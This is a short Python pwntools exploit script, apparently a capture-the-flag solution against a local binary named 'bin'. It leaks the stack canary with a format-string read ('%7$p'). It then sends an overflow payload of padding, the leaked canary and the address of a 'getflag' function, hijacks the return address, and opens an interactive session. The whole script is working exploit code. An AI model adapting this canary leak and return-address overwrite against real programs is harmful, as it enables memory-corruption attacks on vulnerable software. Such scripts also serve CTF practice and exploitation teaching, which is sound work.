from pwn import *

#context.log_level = 'debug'
io = process("./bin")
elf = ELF("./bin")

io.sendline('%7$p')
canary = int(io.recv(), 16)
print hex(canary)

payload = 'A'*100 + p32(canary) + 'B'*12 + p32(elf.symbols['getflag'])
io.send(payload)

io.interactive()